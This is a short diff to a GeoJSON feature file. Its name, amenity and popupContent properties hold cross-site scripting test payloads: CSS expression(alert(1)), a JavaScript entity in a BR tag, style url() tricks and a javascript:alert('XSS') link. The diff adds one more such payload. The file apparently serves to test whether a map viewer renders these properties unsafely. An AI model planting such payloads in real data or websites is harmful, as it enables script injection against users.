@@ -1,7 +1,7 @@
 {
     "type": "Feature",
     "properties": {
-        "name": "<STYLE>BODY{x:expression(alert(1))}</STYLE>",
+        "name": "<STYLE>BODY{x:expression(alert(1))}</STYLE><BR SIZE='&{alert(1)}'>",
         "amenity": "<STYLE>.XSS{background-image:url(\"https://github.com/HanTester/geojson/blob/master/a.geojson\");}</STYLE><A CLASS=XSS></A>",
         "popupContent": "<style>BODY{background:url(\"javascript:alert('XSS')\")}</style>"
     },
